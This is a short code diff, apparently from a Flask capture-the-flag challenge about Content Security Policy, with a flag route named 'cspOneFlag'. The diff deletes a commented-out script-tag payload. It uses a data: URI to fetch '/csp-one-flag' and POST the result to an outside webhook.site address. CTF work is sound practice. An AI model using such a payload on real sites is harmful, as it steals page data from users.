@@ -34,6 +34,3 @@ def cspOneFlag():
 		return "Ah ah ah, you didn't say the magic word"
 
 app.run(host='0.0.0.0', port=8000)
-
-
-# <script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/3357e739-d033-4eee-82dd-a429bbdb5599',{method:'POST',body:data}))"></script>
